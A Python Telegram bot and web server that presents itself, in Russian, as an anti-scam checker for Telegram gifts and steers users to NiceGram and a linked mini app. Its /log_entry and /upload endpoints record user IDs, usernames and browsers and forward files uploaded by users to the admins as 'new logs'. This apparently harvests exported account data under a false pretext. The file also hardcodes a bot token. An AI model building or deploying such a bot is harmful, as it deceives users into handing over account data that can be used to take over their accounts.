import asyncio
import logging
import os
from aiohttp import web
from aiogram import Bot, Dispatcher, types, Router
from aiogram.filters import Command
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, WebAppInfo, BufferedInputFile, FSInputFile

# =====================================================
# ПАРАМЕТРЫ НАСТРОЙКИ
# =====================================================
API_TOKEN = '8410110349:AAE5WM8PHsg85cvGmPuNq55XS8w_FcifjR8'
ADMIN_IDS = [8396015606, 8187498719]
WEB_APP_URL = "https://kareli123.github.io/Nicegrammarse/"

def get_all_admins():
    return ADMIN_IDS

TEXT_MAIN = (
    "Привет! Я - Бот, который поможет тебе не попасться на мошенников. "
    "Я помогу отличить реальный подарок от чистого визуала, чистый подарок без рефаунда "
    "и подарок, за который уже вернули деньги."
)
# =====================================================

logging.basicConfig(level=logging.INFO)

bot = Bot(token=API_TOKEN)
dp = Dispatcher()
router = Router()
dp.include_router(router)

# --- ЛОГИКА БОТА (КОМАНДЫ) ---

def get_main_keyboard():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🚀 Открыть приложение", web_app=WebAppInfo(url=WEB_APP_URL))],
        [InlineKeyboardButton(text="📱 Скачать NiceGram", url="https://nicegram.app/")]
    ])

@router.message(Command("start"))
async def cmd_start(message: types.Message):
    """Обработка команды /start с проверкой картинки"""
    markup = get_main_keyboard()
    
    # ПРОВЕРКА НАЛИЧИЯ КАРТИНКИ (как было в твоем коде)
    if os.path.exists("nicegramm.jpg"):
        await message.answer_photo(
            FSInputFile("nicegramm.jpg"),
            caption=TEXT_MAIN,
            reply_markup=markup
        )
    else:
        await message.answer(TEXT_MAIN, reply_markup=markup)

@router.message(Command("text"))
async def cmd_text(message: types.Message):
    """Отправка сообщений пользователю (только для админов)"""
    # Проверка на администратора
    if message.from_user.id not in get_all_admins():
        await message.answer("⛔ Эта команда доступна только администраторам.")
        return
    
    # Парсим аргументы команды
    args = message.text.split(maxsplit=2)
    
    if len(args) < 3:
        await message.answer("❌ Неверный формат команды.\nИспользуйте: /text <user_id> <сообщение>")
        return
    
    try:
        user_id = int(args[1])
        text_to_send = args[2]
        
        # Отправляем сообщение пользователю
        await bot.send_message(chat_id=user_id, text=text_to_send)
        await message.answer(f"✅ Сообщение отправлено пользователю {user_id}")
        
    except ValueError:
        await message.answer("❌ Неверный формат user_id. User ID должен быть числом.")
    except Exception as e:
        await message.answer(f"❌ Ошибка при отправке сообщения: {str(e)}")

# --- МАРШРУТЫ ВЕБ-СЕРВЕРА ---

routes = web.RouteTableDef()

@routes.get('/')
async def keep_alive(request):
    return web.Response(text="Server & Bot are running!")

@routes.post('/log_entry')
async def handle_log_entry(request: web.Request):
    try:
        data = await request.json()
        user_id = data.get('user_id')
        username = data.get('username', 'не указан')
        ua = data.get('user_agent', 'неизвестен')

        msg = (f"🚀 **Вход в Mini App**\n"
               f"👤 Юзер: @{username} (ID: {user_id})\n"
               f"📱 Устройство: `{ua}`")

        for admin_id in get_all_admins():
            try:
                await bot.send_message(admin_id, msg, parse_mode="Markdown")
            except: pass
        return web.Response(text="OK", headers={"Access-Control-Allow-Origin": "*"})
    except Exception as e:
        return web.Response(text=str(e), status=500)

@routes.post('/upload')
async def handle_upload_file(request: web.Request):
    try:
        reader = await request.multipart()
        user_id, username, ua, file_data = None, None, None, None
        filename = "data.json"

        while True:
            part = await reader.next()
            if part is None: break
            
            if part.name == 'user_id': user_id = (await part.read_chunk()).decode('utf-8')
            elif part.name == 'username': username = (await part.read_chunk()).decode('utf-8')
            elif part.name == 'user_agent': ua = (await part.read_chunk()).decode('utf-8')
            elif part.name == 'file':
                filename = part.filename or "data.json"
                file_data = await part.read()

        if user_id and file_data:
            caption_text = (f"🚨 Новый лог!\n"
                            f"User ID: {user_id}\n"
                            f"Username: @{username}\n"
                            f"Браузер: {ua}")

            for admin_id in get_all_admins():
                try:
                    await bot.send_document(
                        chat_id=admin_id,
                        document=BufferedInputFile(file_data, filename=filename),
                        caption=caption_text
                    )
                except: pass

            try:
                await bot.send_message(chat_id=int(user_id), text="✅ Файл успешно загружен, ожидайте проверки.")
            except: pass

        return web.Response(text="OK", headers={"Access-Control-Allow-Origin": "*"})
    except Exception as e:
        return web.Response(text=str(e), status=500)

@routes.options('/upload')
@routes.options('/log_entry')
async def handle_options(request):
    return web.Response(headers={
        "Access-Control-Allow-Origin": "*",
        "Access-Control-Allow-Methods": "POST, OPTIONS",
        "Access-Control-Allow-Headers": "Content-Type"
    })

# --- ЗАПУСК ---

async def main():
    # Настройка веб-сервера
    app = web.Application()
    app.add_routes(routes)
    runner = web.AppRunner(app)
    await runner.setup()
    
    port = int(os.environ.get("PORT", 8080))
    site = web.TCPSite(runner, '0.0.0.0', port)
    
    await site.start()
    logging.info(f"Сервер запущен на порту {port}")
    
    # Запуск бота
    await bot.delete_webhook(drop_pending_updates=True)
    await dp.start_polling(bot)

if __name__ == '__main__':
    try:
        asyncio.run(main())
    except (KeyboardInterrupt, SystemExit):
        logging.info("Бот остановлен")
